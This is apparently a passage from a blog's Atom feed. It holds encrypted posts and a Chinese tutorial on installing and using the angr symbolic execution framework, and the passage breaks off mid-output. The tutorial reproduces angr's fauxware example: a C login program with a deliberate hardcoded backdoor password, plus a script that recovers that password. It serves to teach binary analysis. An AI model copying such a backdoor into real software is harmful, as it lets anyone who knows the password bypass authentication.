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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 